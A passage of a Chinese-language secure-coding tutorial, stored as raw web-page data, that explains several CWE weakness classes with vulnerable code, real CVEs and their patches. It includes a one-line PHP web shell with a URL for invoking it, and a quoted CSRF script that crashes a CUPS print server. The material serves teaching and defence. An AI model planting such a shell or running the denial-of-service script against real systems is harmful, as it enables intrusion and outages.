target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在bingo!CMS 1.2及更早版本中存在CSRF漏洞，远程攻击者可劫持其他用户对修改配置或更改内容请求的身份验证。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/434.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-434: Unrestricted Upload of File with Dangerous Type\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"缺少对上传文件类型的验证。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"下面的代码中，前端希望用户上传一个图片，\u003ccode class=\\\"x-inline-highlight\\\"\u003eupload_picture.php\u003c/code\u003e处理上传的文件，并尝试储存在\u003ccode class=\\\"x-inline-highlight\\\"\u003epictures/\u003c/code\u003e中。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003cform action=\\\"upload_picture.php\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\"\u003e\\n    Choose a file to upload:\\n    \u003cinput type=\\\"file\\\" name=\\\"filename\\\"/\u003e\\n    \u003cbr/\u003e\\n    \u003cinput type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Submit\\\"/\u003e\\n\u003c/form\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2b\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"//upload_picture.php\\n...\\n// Define the target location where the picture being\\n// uploaded is going to be saved.\\n$target = \\\"pictures/\\\" . basename($_FILES['uploadedfile']['name']);\\n\\n// Move the uploaded file to the new location.\\nif(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))\\n{\\n    echo \\\"The picture has been successfully uploaded.\\\";\\n}\\nelse\\n{\\n    echo \\\"There was an error uploading the picture, please try again.\\\";\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2c\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上述代码的问题是没有检查传入的文件类型，以至于攻击者可以上传一份\u003ccode class=\\\"x-inline-highlight\\\"\u003emalicious.php\u003c/code\u003e，并且用它来执行系统代码：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c?php\\n    //malicious.php\\n    system($_GET['cmd']);\\n?\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token php language-php\\\"\u003e\u003cspan class=\\\"token delimiter important\\\"\u003e\u0026lt;?php\u003c/span\u003e\\n    \u003cspan class=\\\"token comment\\\"\u003e//malicious.php\u003c/span\u003e\\n    \u003cspan class=\\\"token function\\\"\u003esystem\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'cmd'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token delimiter important\\\"\u003e?\u003e\u003c/span\u003e\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上传成功后通过类似以下形式的URL调用：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2019-1010062\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2019-1010062\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"if (isset($_POST['submit'])) {\\n    //Check if the file is JPG, PNG or GIF.\\n    if (in_array($_FILES['imagefile']['type'], array('image/pjpeg', 'image/jpeg','image/png', 'image/gif'))) {\\n        /* fix issue 44. Thanks to Klaus.  */\\n        $imagewhitelist = array('jfif', '.png', '.jpg', '.gif', 'jpeg');\\n        if (!in_array(strtolower(substr($_FILES['imagefile']['name'], -4)), $imagewhitelist))\\n            show_error($lang['general']['upload_failed'], 1);\\n        /* end of fix issue 44. Thanks to Klaus.  */\\n        if (!copy($_FILES['imagefile']['tmp_name'], 'images/'.$_FILES['imagefile']['name']))\\n            show_error($lang['general']['upload_failed'], 1);\\n        else {\\n            chmod('images/'.$_FILES['imagefile']['name'], 0666);\\n            ?\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 96px, var(--bg-transparent-green) 96px 216px, transparent 216px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2d\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"按照补丁之前的逻辑，修改HTTP请求中的MIME类型就可以绕过原有的验证。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/862.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-862: Missing Authorization\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"缺少授权，没有验证用户是否有权访问资源。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-golden\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Authentication \u0026 Authorization\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eAuthentication (AuthN)\u003c/code\u003e，身份认证，通常在授权之前完成，是验证“用户是谁”的过程。一般通过账号密码、人脸识别的方式。\u003cbr/\u003e例如：员工通过输入用户名和密码登录公司网络。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eAuthorization (AuthZ)\u003c/code\u003e，授权，是确认用户是否有权访问资源。一般通过角色规则（管理员、普通用户）等方式。\u003cbr/\u003e例如：普通员工登录公司网络后，不能访问公司较为敏感的数据。\"}}]}]]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"function runEmployeeQuery($dbName, $name)\\n{\\n    mysql_select_db($dbName,$globalDbHandle) or die(\\\"Could not open Database\\\".$dbName);\\n    //Use a prepared statement to avoid CWE-89\\n    $preparedStatement = $globalDbHandle-\u003eprepare('SELECT * FROM employees WHERE name = :name');\\n    $preparedStatement-\u003eexecute(array(':name' =\u003e $name));\\n    return $preparedStatement-\u003efetchAll();\\n}\\n...\\n$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这段代码小心地检查了SQL注入风险（通过\u003ccode class=\\\"x-inline-highlight\\\"\u003eprepare\u003c/code\u003e函数），但却没有验证执行数据库操作的用户是否具有权限。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2022-24730\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2022-24730\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"报告：\u003ca href=\\\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"问题的大致描述为：从v1.3.0开始，未打补丁的Argo CD版本都容易受到路径遍历错误的影响，再加上不适当的访问控制错误，可能允许具有只读存储库访问权限的恶意用户从Argo CD的存储库服务器中泄露敏感文件。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"有读权限的用户可以给\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/v1/repositories/{repo_url}/appdetails\u003c/code\u003e发送带有恶意载荷请求以访问预期之外的文件。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"补丁的作用：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"防止路径遍历；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"限制对\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/v1/repositories/{repo_url}/appdetails\u003c/code\u003e的访问权限，只有以下两类用户可以：\"}}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"1.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"拥有\u003ccode class=\\\"x-inline-highlight\\\"\u003ecreate\u003c/code\u003e权限的用户\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"2.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"拥有\u003ccode class=\\\"x-inline-highlight\\\"\u003eget\u003c/code\u003e权限的用户，并且\u003ccode class=\\\"x-inline-highlight\\\"\u003erepo_url\u003c/code\u003e已经被给定的应用使用。\"}}]}]]}]]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/476.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-476: NULL Pointer Dereference\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"对空指针解引用（取内容），也就是\u003ccode class=\\\"x-inline-highlight\\\"\u003e*\u003c/code\u003e运算符。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"void host_lookup(char *user_supplied_addr)\\n{\\n    struct hostent *hp;\\n    in_addr_t *addr;\\n    char hostname[64];\\n    in_addr_t inet_addr(const char *cp);\\n\\n    /*routine that ensures user_supplied_addr is in the right format for conversion */\\n\\n    validate_addr_form(user_supplied_addr);\\n    addr = inet_addr(user_supplied_addr);\\n    hp = gethostbyaddr(addr, sizeof(struct in_addr), AF_INET);\\n    strcpy(hostname, hp-\u003eh_name);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2f\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果\u003ccode class=\\\"x-inline-highlight\\\"\u003egethostbyaddr\u003c/code\u003e返回\u003ccode class=\\\"x-inline-highlight\\\"\u003eNULL\u003c/code\u003e，\u003ccode class=\\\"x-inline-highlight\\\"\u003ehp\u003c/code\u003e就是空指针，\u003ccode class=\\\"x-inline-highlight\\\"\u003estrcpy\u003c/code\u003e会导致空指针解引用。程序缺少对其返回值的检查。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2008-5183\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2008-5183\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://www.exploit-db.com/exploits/7150\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://www.exploit-db.com/exploits/7150\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"通过CSRF发出大量\u003ccode class=\\\"x-inline-highlight\\\"\u003eadd-rss-subscription\u003c/code\u003e请求，触发空指针引用（此处没有找到源码），进而导致DoS攻击。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c!-- cat cups_dos_poc.html  --\u003e\\n\u003cscript\u003e\\n// make 101 CSRFed requests to CUPS daemon via 'img' tags\\n// causes CUPS daemon to crash\\n// by Adrian 'pagvac' Pastor | GNUCITIZEN.org\\n\\nfor(var i=1;i\u003c=101;++i) {\\n    document.write(\\\"\u003cimg width=0 height=0 \\\" +\\n        \\\"src=\\\\\\\"http://localhost:631/admin/?OP=add-rss-subscription\u0026SUBSCRIPTION_NAME=DOS_TEST_\\\" +\\n        i + \\\"\u0026PRINTER_URI=%23ALL%23\u0026EVENT_JOB_CREATED=on\u0026MAX_EVENTS=20\\\\\\\"\u003e\\\");\\n}\\n\\n/*\\nTESTED ON:\\n\\nUbuntu 8.04.1 (fully patched as of 19th Oct 2008)\\nLinux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux\\n\\nopenSUSE 11.0 (i586)\\nLinux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux\\n\\nCommon UNIX Printing System 1.3.7\\n*/\\n\u003c/script\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$30\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/287.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-287: Improper Authentication\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"身份认证不当，当声明拥有某个身份时，程序不足以证明该声明是正确的。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Perl\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"my $x = new CGI;\\n\\nif ($x-\u003ecookie('loggedin') ne \\\"true\\\")\\n{\\n    if (!AuthenticateUser($x-\u003eparam('username'), $x-\u003eparam('password')))\\n    {\\n        ExitError(\\\"Error: you need to log in first\\\");\\n    }\\n    else\\n    {\\n        #Set loggedin and user cookies.\\n        $x-\u003ecookie(\\n            -name = \u003e 'loggedin',\\n            -value = \u003e 'true');\\n\\n        $x-\u003ecookie(\\n            -name = \u003e 'user',\\n            -value = \u003e $x-\u003eparam('username'));\\n    }\\n}\\n\\nif ($x-\u003ecookie('user') eq \\\"Administrator\\\")\\n{\\n    DoAdministratorTasks();\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$31\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"使用cookie做认证，是可以直接被绕过的！\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2022-36436\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2022-36436\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$32\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 216px, var(--bg-transparent-red) 216px 264px, transparent 264px, transparent 264px, var(--bg-transparent-green) 264px 312px, transparent 312px, transparent 696px, var(--bg-transparent-red) 696px 768px, transparent 768px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$33\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x02\\\\x01\\\\x02\u003c/code\u003e分别代表支持的列表长度、列表内容，原先可能因为某些原因支持无认证模式访问，存在漏洞利用风险。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/190.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-190: Integer Overflow or Wraparound\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"整数溢出或整数回绕，当有符号数相加超过正负值上限时可能发生溢出；当无符号数相加超过上限就会从\u003ccode class=\\\"x-inline-highlight\\\"\u003e0\u003c/code\u003e开始“回绕”；或者计算\u003ccode class=\\\"x-inline-highlight\\\"\u003eunsigned(0) - 1\u003c/code\u003e时，会得到最大值。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"img_t table_ptr; /*struct containing img data, 10kB each*/\\nint num_imgs;\\n...\\nnum_imgs = get_num_imgs();\\ntable_ptr = (img_t *)malloc(sizeof(img_t) * num_imgs);\\n...\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$34\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"随着\u003ccode class=\\\"x-inline-highlight\\\"\u003enum_imgs\u003c/code\u003e增大，乘积计算结果可能发生回绕，导致最终分配了一个很小的内存空间。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"short int bytesRec = 0;\\nchar buf[SOMEBIGNUM];\\n\\nwhile (bytesRec \u003c MAXGET)\\n{\\n    bytesRec += getFromInput(buf + bytesRec);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eshort\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eint\u003c/span\u003e bytesRec \u003cspan class=\\\"token 